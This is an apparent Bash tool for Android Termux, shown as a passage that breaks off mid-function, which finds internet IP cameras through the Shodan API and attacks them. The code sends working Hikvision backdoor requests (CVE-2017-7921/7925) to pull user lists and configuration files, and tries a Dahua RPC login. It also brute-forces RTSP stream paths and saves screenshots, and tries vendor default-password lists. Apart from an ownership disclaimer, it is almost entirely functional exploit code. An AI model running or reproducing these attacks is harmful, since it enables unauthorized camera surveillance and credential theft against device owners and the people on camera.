#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════╗
# ║        CAM-SEC SCANNER PRO v2.1 - Professional Edition              ║
# ║         IP Camera Security Audit Framework with Exploit Engine      ║
# ║              For Termux (Android) - Rootless                        ║
# ╚══════════════════════════════════════════════════════════════════════╝
# DISCLAIMER: Use ONLY on devices YOU OWN. Unauthorized access
# to cameras you don't own is ILLEGAL and punishable by law.
# ═══════════════════════════════════════════════════════════════════════

# ╔══════════════════════════════════════════════════════════════════════╗
# ║                          COLOR DEFINITIONS                          ║
# ╚══════════════════════════════════════════════════════════════════════╝
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'
WHITE='\033[1;37m'; BOLD='\033[1m'; NC='\033[0m'

# ╔══════════════════════════════════════════════════════════════════════╗
# ║                          MAIN BANNER                                ║
# ╚══════════════════════════════════════════════════════════════════════╝
BANNER="
${CYAN}╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  ${WHITE}   ██████╗  █████╗ ███╗   ███╗      ███████╗███████╗ ██████╗    ${CYAN}║
║  ${WHITE}  ██╔════╝ ██╔══██╗████╗ ████║      ██╔════╝██╔════╝██╔════╝    ${CYAN}║
║  ${WHITE}  ██║      ███████║██╔████╔██║█████╗███████╗█████╗  ██║         ${CYAN}║
║  ${WHITE}  ██║      ██╔══██║██║╚██╔╝██║╚════╝╚════██║██╔══╝  ██║         ${CYAN}║
║  ${WHITE}  ╚██████╗ ██║  ██║██║ ╚═╝ ██║      ███████║███████╗╚██████╗    ${CYAN}║
║  ${WHITE}   ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝      ╚══════╝╚══════╝ ╚═════╝    ${CYAN}║
║                                                                      ║
║  ${MAGENTA}███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗    ${CYAN}║
║  ${MAGENTA}██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗   ${CYAN}║
║  ${MAGENTA}███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝   ${CYAN}║
║  ${MAGENTA}╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗   ${CYAN}║
║  ${MAGENTA}███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║   ${CYAN}║
║  ${MAGENTA}╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   ${CYAN}║
║                                                                      ║
║  ${WHITE}        PRO v2.1 | RTSP Capture | Shodan | JSON Export           ${CYAN}║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
${RED}  ⚠ WARNING: Use ONLY on cameras YOU OWN. Unauthorized access is ILLEGAL!${NC}
"

# ╔══════════════════════════════════════════════════════════════════════╗
# ║                      GLOBAL CONFIGURATION                           ║
# ╚══════════════════════════════════════════════════════════════════════╝
SCRIPT_DIR="$HOME/.camsec"
LOG_DIR="$SCRIPT_DIR/logs"
REPORT_DIR="$SCRIPT_DIR/reports"
CAPTURE_DIR="$SCRIPT_DIR/captures"
CONFIG_FILE="$SCRIPT_DIR/config.cfg"
mkdir -p "$LOG_DIR" "$REPORT_DIR" "$CAPTURE_DIR"

# Default config
SHODAN_API_KEY=""
[[ -f "$CONFIG_FILE" ]] && source "$CONFIG_FILE"

# JSON output file
JSON_OUTPUT="$REPORT_DIR/scan_results_$(date +%Y%m%d_%H%M%S).json"

# ╔══════════════════════════════════════════════════════════════════════╗
# ║                      LOGGING SYSTEM                                 ║
# ╚══════════════════════════════════════════════════════════════════════╝
log() {
    local level="$1"; local msg="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[${timestamp}] [${level}] ${msg}" >> "$LOG_DIR/scanner.log"
}

# Initialize JSON file
init_json() {
    cat > "$JSON_OUTPUT" << 'EOF'
{
  "scanner": "CAM-SEC PRO v2.1",
  "scan_date": "",
  "scan_duration_seconds": 0,
  "targets": [],
  "shodan_results": [],
  "summary": {
    "total_scanned": 0,
    "vulnerable": 0,
    "credentials_found": 0,
    "screenshots_captured": 0
  }
}
EOF
    # Insert actual date
    local now=$(date -Iseconds)
    sed -i "s/\"scan_date\": \"\"/\"scan_date\": \"$now\"/" "$JSON_OUTPUT"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║                    DEPENDENCY INSTALLER                             ║
# ╚══════════════════════════════════════════════════════════════════════╝
setup_deps() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║          INSTALLING DEPENDENCIES             ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    
    local deps=("nmap" "curl" "ffmpeg" "python" "wget" "jq" "openssl")
    local pip_deps=("requests" "colorama" "shodan")
    local installed=0; local failed=0
    
    pkg update -y &>/dev/null
    
    for dep in "${deps[@]}"; do
        printf "${YELLOW}[*] Installing %-12s${NC}" "$dep..."
        if pkg install "$dep" -y &>/dev/null; then
            echo -e "\r${GREEN}[✓] %-12s installed     ${NC}" "$dep"
            ((installed++))
        else
            echo -e "\r${RED}[✗] %-12s FAILED        ${NC}" "$dep"
            ((failed++))
        fi
    done
    
    for pkg in "${pip_deps[@]}"; do
        printf "${YELLOW}[*] Installing pip:%-8s${NC}" "$pkg..."
        if pip install "$pkg" &>/dev/null; then
            echo -e "\r${GREEN}[✓] pip:%-8s installed     ${NC}" "$pkg"
            ((installed++))
        else
            echo -e "\r${RED}[✗] pip:%-8s FAILED        ${NC}" "$pkg"
            ((failed++))
        fi
    done
    
    echo -e "\n${GREEN}[✓] ${installed} installed, ${RED}${failed} failed${NC}"
    log "INFO" "Dependencies: $installed success, $failed failed"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              SHODAN API CONFIGURATION                               ║
# ╚══════════════════════════════════════════════════════════════════════╝
configure_shodan() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║          SHODAN API CONFIGURATION            ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}  Get your free API key at: https://account.shodan.io${NC}"
    echo ""
    read -p "  Enter Shodan API key: " api_key
    
    if [[ -n "$api_key" ]]; then
        echo "SHODAN_API_KEY=\"$api_key\"" > "$CONFIG_FILE"
        SHODAN_API_KEY="$api_key"
        echo -e "\n${GREEN}[✓] API key saved successfully${NC}"
        log "INFO" "Shodan API key configured"
    else
        echo -e "\n${RED}[!] No key entered${NC}"
    fi
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              SHODAN SEARCH ENGINE (Real API)                        ║
# ╚══════════════════════════════════════════════════════════════════════╝
shodan_search() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║            SHODAN CAMERA SEARCH              ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    echo ""
    
    if [[ -z "$SHODAN_API_KEY" ]]; then
        echo -e "${RED}[!] Shodan API key not configured!${NC}"
        echo -e "${YELLOW}[*] Run option 7 to configure Shodan first.${NC}"
        read -p "Press Enter..."
        return
    fi
    
    echo -e "${WHITE}  Select search query:${NC}"
    echo -e "  ${CYAN}[1]${NC} Hikvision cameras"
    echo -e "  ${CYAN}[2]${NC} Dahua cameras"
    echo -e "  ${CYAN}[3]${NC} RTSP open streams"
    echo -e "  ${CYAN}[4]${NC} ONVIF devices"
    echo -e "  ${CYAN}[5]${NC} Custom query"
    echo ""
    read -p "  Choice > " shodan_choice
    
    local query=""
    case $shodan_choice in
        1) query="Hikvision" ;;
        2) query="Dahua" ;;
        3) query="port:554 has_screenshot:true" ;;
        4) query="ONVIF port:80" ;;
        5) read -p "  Enter custom query: " query ;;
        *) echo -e "${RED}[!] Invalid${NC}"; return ;;
    esac
    
    echo -e "\n${YELLOW}[*] Searching Shodan for: ${WHITE}${query}${NC}"
    echo -e "${YELLOW}[*] Fetching results (max 20)...${NC}\n"
    
    # Real Shodan API call
    local response=$(curl -s "https://api.shodan.io/shodan/host/search?key=${SHODAN_API_KEY}&query=$(echo "$query" | jq -sRr @uri)&limit=20" 2>/dev/null)
    
    if echo "$response" | grep -q "error\|Invalid API key"; then
        echo -e "${RED}[!] API Error: $(echo "$response" | jq -r '.error // "Unknown error"')${NC}"
        log "ERROR" "Shodan API error: $response"
        return
    fi
    
    local total=$(echo "$response" | jq -r '.total // 0')
    echo -e "${GREEN}[+] Total results found: ${total}${NC}"
    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    
    # Parse and display results
    local count=0
    echo "$response" | jq -c '.matches[]' 2>/dev/null | while read -r match; do
        local ip=$(echo "$match" | jq -r '.ip_str')
        local port=$(echo "$match" | jq -r '.port')
        local org=$(echo "$match" | jq -r '.org // "Unknown"')
        local country=$(echo "$match" | jq -r '.location.country_name // "Unknown"')
        local data=$(echo "$match" | jq -r '.data' | head -c 200 | tr '\n' ' ')
        
        echo -e "${CYAN}  [${count}] ${WHITE}${ip}:${port}${NC}"
        echo -e "      Org: ${org} | Country: ${country}"
        echo -e "      Banner: ${data:0:100}..."
        echo ""
        ((count++))
        
        # Add to JSON
        local json_entry=$(jq -n \
            --arg ip "$ip" \
            --arg port "$port" \
            --arg org "$org" \
            --arg country "$country" \
            '{ip: $ip, port: $port, org: $org, country: $country}')
        
        # Append to JSON file
        jq ".shodan_results += [$json_entry]" "$JSON_OUTPUT" > "${JSON_OUTPUT}.tmp" && mv "${JSON_OUTPUT}.tmp" "$JSON_OUTPUT"
    done
    
    echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    log "INFO" "Shodan search completed: $query ($total results)"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              HOST DISCOVERY (Single nmap, cached)                    ║
# ╚══════════════════════════════════════════════════════════════════════╝
discover_hosts() {
    local local_ip=$(ifconfig wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}')
    [[ -z "$local_ip" ]] && { echo -e "${RED}[!] No WiFi connection${NC}"; log "ERROR" "No WiFi"; return 1; }
    
    local subnet=$(echo "$local_ip" | cut -d. -f1-3)
    local cache_file="$SCRIPT_DIR/.hosts_cache"
    
    [[ -f "$cache_file" ]] && [[ $(($(date +%s) - $(stat -c %Y "$cache_file"))) -lt 300 ]] && { cat "$cache_file"; return 0; }
    
    echo -e "${YELLOW}[*] Discovering hosts on ${subnet}.0/24...${NC}"
    nmap -sn --host-timeout 3s "${subnet}.0/24" 2>/dev/null | \
        awk '/Nmap scan report/{print $NF}' | tr -d '()' > "$cache_file"
    
    cat "$cache_file"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              SMART CAMERA FINGERPRINTING                            ║
# ╚══════════════════════════════════════════════════════════════════════╝
fingerprint_camera() {
    local ip="$1"
    local result_file="$SCRIPT_DIR/.fingerprint_${ip//./_}"
    
    [[ -f "$result_file" ]] && { cat "$result_file"; return; }
    
    log "INFO" "Fingerprinting $ip"
    
    local raw=$(nmap -sV --version-intensity 2 -p 80,443,554,8080,8443,37777,8554,8000,888 --host-timeout 15s "$ip" 2>/dev/null)
    local headers=$(curl -sI -m 3 "http://${ip}" 2>/dev/null)
    local server_header=$(echo "$headers" | grep -i "^Server:" | tr -d '\r')
    local www_auth=$(echo "$headers" | grep -i "^WWW-Authenticate:" | tr -d '\r')
    local status=$(curl -s -o /dev/null -w "%{http_code}" -m 3 "http://${ip}" 2>/dev/null)
    
    local vendor="Unknown"
    local model="Unknown"
    
    if echo "$server_header" | grep -qi "Hikvision\|hikvision"; then
        vendor="Hikvision"
        model=$(echo "$server_header" | grep -oP 'Hikvision[^ ]*' || echo "Generic")
    elif echo "$server_header" | grep -qi "Dahua\|dahua\|DVR"; then
        vendor="Dahua"
    elif echo "$server_header" | grep -qi "reolink\|Reolink"; then
        vendor="Reolink"
    elif echo "$server_header" | grep -qi "Foscam\|foscam"; then
        vendor="Foscam"
    elif echo "$server_header" | grep -qi "TP-LINK\|tp-link"; then
        vendor="TP-Link"
    elif echo "$server_header" | grep -qi "GoAhead\|goahead"; then
        vendor="GoAhead-Webs"
    elif echo "$server_header" | grep -qi "nginx\|Nginx"; then
        vendor="Nginx-Based"
    elif echo "$server_header" | grep -qi "Apache\|apache"; then
        vendor="Apache-Based"
    fi
    
    if echo "$www_auth" | grep -qi "Digest"; then
        model="${model} (Digest Auth)"
    elif echo "$www_auth" | grep -qi "Basic"; then
        model="${model} (Basic Auth - Weak!)"
    fi
    
    local onvif_check=$(curl -s -m 2 "http://${ip}:8080/onvif/device_service" 2>/dev/null)
    local has_onvif="No"
    [[ -n "$onvif_check" ]] && has_onvif="Yes"
    
    local open_ports=$(echo "$raw" | grep '/tcp.*open' | awk '{print $1}' | tr '\n' ' ')
    
    {
        echo "FINGERPRINT:${ip}"
        echo "VENDOR:${vendor}"
        echo "MODEL:${model}"
        echo "STATUS_CODE:${status}"
        echo "SERVER:${server_header:-None}"
        echo "WWW_AUTH:${www_auth:-None}"
        echo "ONVIF:${has_onvif}"
        echo "OPEN_PORTS:${open_ports}"
    } > "$result_file"
    
    cat "$result_file"
    log "INFO" "Fingerprint: $ip -> $vendor $model"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              RTSP SCREENSHOT CAPTURE (Real ffmpeg extraction)        ║
# ╚══════════════════════════════════════════════════════════════════════╝
capture_rtsp_screenshot() {
    local ip="$1"
    local rtsp_path="$2"
    local rtsp_url="rtsp://${ip}:554${rtsp_path}"
    
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local safe_ip="${ip//./_}"
    local output_file="${CAPTURE_DIR}/${safe_ip}_${timestamp}.jpg"
    
    echo -e "${YELLOW}[*] Capturing screenshot from: ${rtsp_url}${NC}"
    
    # Capture a single frame (I-frame) with 3 second timeout
    # -v quiet: no output, -frames:v 1: single frame, -rtsp_transport tcp: reliable
    ffmpeg -v quiet -rtsp_transport tcp -i "$rtsp_url" -frames:v 1 -q:v 2 -y "$output_file" 2>/dev/null &
    local ffmpeg_pid=$!
    
    # Kill if takes too long
    (
        sleep 5
        kill $ffmpeg_pid 2>/dev/null
    ) &
    local watchdog=$!
    
    wait $ffmpeg_pid 2>/dev/null
    kill $watchdog 2>/dev/null
    
    if [[ -f "$output_file" ]] && [[ $(stat -c %s "$output_file" 2>/dev/null) -gt 1000 ]]; then
        echo -e "${GREEN}[✓] Screenshot saved: ${output_file}${NC}"
        log "INFO" "RTSP screenshot captured: $rtsp_url -> $output_file"
        
        # Return JSON entry
        jq -n \
            --arg ip "$ip" \
            --arg rtsp_url "$rtsp_url" \
            --arg file "$output_file" \
            --arg timestamp "$timestamp" \
            '{ip: $ip, rtsp_url: $rtsp_url, screenshot: $file, timestamp: $timestamp}'
        return 0
    else
        rm -f "$output_file"
        echo -e "${RED}[!] Failed to capture screenshot (stream may require auth)${NC}"
        log "WARNING" "RTSP screenshot failed: $rtsp_url"
        return 1
    fi
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              RTSP STREAM SCANNER + AUTO CAPTURE                     ║
# ╚══════════════════════════════════════════════════════════════════════╝
scan_rtsp_with_capture() {
    local ip="$1"
    
    local paths=(
        "/live" "/live/main" "/live/sub" "/live/ch00_0" "/live/ch01_0"
        "/h264" "/h264/ch01/main/av_stream" "/h264/ch01/sub/av_stream"
        "/stream1" "/stream2" "/cam/realmonitor"
        "/cam/realmonitor?channel=1&subtype=0"
        "/video" "/video1" "/playback" "/media/video1"
        "/onvif/device_service" "/ch01/0" "/ch01/1"
        "/profile1" "/av0_0" "/mpeg4/media.amp"
        "/streaming/channels/0" "/streaming/channels/1"
        "/Streaming/Channels/101" "/Streaming/Channels/102"
        "/ISAPI/Streaming/channels/101"
        "/unicast" "/11" "/12"
    )
    
    local found=0
    local screenshots_json="[]"
    
    echo -e "${YELLOW}[*] Scanning RTSP streams on ${ip}...${NC}"
    
    for path in "${paths[@]}"; do
        local rtsp_url="rtsp://${ip}:554${path}"
        printf "${YELLOW}[*] Testing: %s${NC}\r" "$path"
        
        local result=$(timeout 4s ffprobe -v quiet -rtsp_transport tcp -i "$rtsp_url" -show_entries stream=codec_type 2>&1)
        
        if echo "$result" | grep -q "codec_type=video"; then
            echo -e "${GREEN}[+] OPEN STREAM: ${rtsp_url}${NC}                     "
            ((found++))
            
            # Auto-capture screenshot
            local screenshot_json=$(capture_rtsp_screenshot "$ip" "$path")
            if [[ $? -eq 0 ]]; then
                screenshots_json=$(echo "$screenshots_json" | jq ". + [$screenshot_json]" 2>/dev/null)
            fi
        fi
    done
    
    echo ""
    echo -e "${WHITE}  Found ${found} open RTSP stream(s)${NC}"
    
    # Return results as JSON for integration
    jq -n \
        --arg ip "$ip" \
        --argjson found "$found" \
        --argjson screenshots "$screenshots_json" \
        '{ip: $ip, open_streams: $found, screenshots: $screenshots}'
    
    log "INFO" "$ip: RTSP scan complete - $found streams found"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              VULNERABILITY SCANNER (Real CVEs)                       ║
# ╚══════════════════════════════════════════════════════════════════════╝
scan_vulnerabilities() {
    local ip="$1"
    local fp=$(fingerprint_camera "$ip")
    local vendor=$(echo "$fp" | grep "VENDOR:" | cut -d: -f2-)
    local model=$(echo "$fp" | grep "MODEL:" | cut -d: -f2-)
    local www_auth=$(echo "$fp" | grep "WWW_AUTH:" | cut -d: -f2-)
    local onvif=$(echo "$fp" | grep "ONVIF:" | cut -d: -f2-)
    
    local vulns_json="[]"
    
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║    VULNERABILITY SCAN: ${WHITE}${ip}${CYAN}    ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    echo -e "${WHITE}  Vendor: ${YELLOW}${vendor}${NC}"
    echo -e "${WHITE}  Model:  ${YELLOW}${model}${NC}\n"
    
    # ─── CVE-2017-7921: Hikvision Backdoor ───
    if [[ "$vendor" == "Hikvision" ]]; then
        local hik_test=$(curl -s -m 3 "http://${ip}/Security/users?auth=YWRtaW46MTEK" 2>/dev/null)
        if echo "$hik_test" | grep -qi "userName.*admin"; then
            echo -e "  ${RED}[CRITICAL] CVE-2017-7921: Hikvision Backdoor${NC}"
            vulns_json=$(echo "$vulns_json" | jq '. + [{"cve": "CVE-2017-7921", "severity": "critical", "description": "Hikvision backdoor - admin access without authentication"}]')
            log "CRITICAL" "$ip: CVE-2017-7921"
        fi
        
        # CVE-2017-7925: Config file leak
        local config_test=$(curl -s -m 3 "http://${ip}/System/configurationFile?auth=YWRtaW46MTEK" 2>/dev/null)
        if echo "$config_test" | grep -qi "DeviceInfo\|userList"; then
            echo -e "  ${RED}[CRITICAL] CVE-2017-7925: Configuration file exposed${NC}"
            vulns_json=$(echo "$vulns_json" | jq '. + [{"cve": "CVE-2017-7925", "severity": "critical", "description": "Configuration file exposed with plaintext passwords"}]')
            log "CRITICAL" "$ip: CVE-2017-7925"
        fi
        
        # Snapshot bypass
        local snap_test=$(curl -s -o /dev/null -w "%{http_code}" -m 3 "http://${ip}/onvif-http/snapshot?auth=YWRtaW46MTEK" 2>/dev/null)
        if [[ "$snap_test" == "200" ]]; then
            echo -e "  ${RED}[CRITICAL] Unauthenticated snapshot access${NC}"
            vulns_json=$(echo "$vulns_json" | jq '. + [{"cve": "CVE-2017-7921", "severity": "critical", "description": "Unauthenticated snapshot via ONVIF"}]')
        fi
    fi
    
    # ─── CVE-2021-33044: Dahua RPC Bypass ───
    if [[ "$vendor" == "Dahua" ]]; then
        local dahua_test=$(curl -s -m 3 -X POST "http://${ip}/RPC2_Login" \
            -d '{"method":"global.login","params":{"userName":"admin","password":"admin","clientType":"Web3.0"}}' 2>/dev/null)
        if echo "$dahua_test" | grep -qi "session\|id.*[0-9]"; then
            echo -e "  ${RED}[CRITICAL] CVE-2021-33044: Dahua RPC authentication bypass${NC}"
            vulns_json=$(echo "$vulns_json" | jq '. + [{"cve": "CVE-2021-33044", "severity": "critical", "description": "Dahua RPC2 authentication bypass"}]')
            log "CRITICAL" "$ip: CVE-2021-33044"
        fi
    fi
    
    # ─── Generic vulnerabilities ───
    local env_test=$(curl -s -o /dev/null -w "%{http_code}" -m 2 "http://${ip}/.env" 2>/dev/null)
    [[ "$env_test" == "200" ]] && {
        echo -e "  ${RED}[HIGH] /.env file exposed${NC}"
        vulns_json=$(echo "$vulns_json" | jq '. + [{"cve": "N/A", "severity": "high", "description": "/.env file exposed"}]')
    }
    
    local backup_test=$(curl -s -o /dev/null -w "%{http_code}" -m 2 "http://${ip}/config/backup.cfg" 2>/dev/null)
    [[ "$backup_test" == "200" ]] && {
        echo -e "  ${RED}[HIGH] Backup config accessible${NC}"
        vulns_json=$(echo "$vulns_json" | jq '. + [{"cve": "N/A", "severity": "high", "description": "Backup configuration file accessible"}]')
    }
    
    if [[ "$onvif" == "Yes" ]]; then
        echo -e "  ${YELLOW}[MEDIUM] ONVIF service exposed${NC}"
        vulns_json=$(echo "$vulns_json" | jq '. + [{"cve": "N/A", "severity": "medium", "description": "ONVIF service exposed"}]')
    fi
    
    if echo "$www_auth" | grep -qi "Basic"; then
        echo -e "  ${YELLOW}[MEDIUM] HTTP Basic Auth in use${NC}"
        vulns_json=$(echo "$vulns_json" | jq '. + [{"cve": "N/A", "severity": "medium", "description": "HTTP Basic Auth - credentials in plaintext"}]')
    fi
    
    # Return vulnerabilities JSON
    echo "$vulns_json"
    log "INFO" "$ip: Vulnerability scan complete"
}

# ╔══════════════════════════════════════════════════════════════════════╗
# ║              SMART CREDENTIAL TEST                                  ║
# ╚══════════════════════════════════════════════════════════════════════╝
bruteforce_camera() {
    local ip="$1"
    local fp=$(fingerprint_camera "$ip")
    local vendor=$(echo "$fp" | grep "VENDOR:" | cut -d: -f2-)
    
    echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║      CREDENTIAL TEST: ${WHITE}${ip}${CYAN}     ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    
    local creds=()
    case "$vendor" in
        "Hikvision")
            creds=("admin:admin" "admin:12345" "admin:123456" "admin:hikvision" "admin:7ujMko0admin" "admin:1111" "admin:666666") ;;
        "Dahua")
            creds=("admin:admin" "admin:123456" "admin:888888" "admin:666666" "888888:888888" "666666:666666") ;;
        *)
            creds=("admin:admin" "admin:12345" "admin:password" "admin:123456" "root:root" "user:user" "guest:guest") ;;
    esac
    
    local found_creds="[]"
    local found_count=0
    
    for cred in "${creds[@]}"; do
        local user="${cred%%:*}"
        local pass="${cred##*:}"
        
        local response=$(curl -s -o /dev/null -w "%{http_code}" -m 2 -u "$user:$pass" "http://${ip}" 2>/dev/null)
        
        if [[ "$response" =~ ^(200|30[0-9])$ ]]; then
            echo -e "  ${RED}[!] WEAK CREDENTIALS: ${user}:${pass}${NC}"
            found_creds=$(echo "$found_creds" | jq --arg u "$user" --arg p "$pass" '. + [{"username": $u, "password": $p}]')
            ((found_count++))
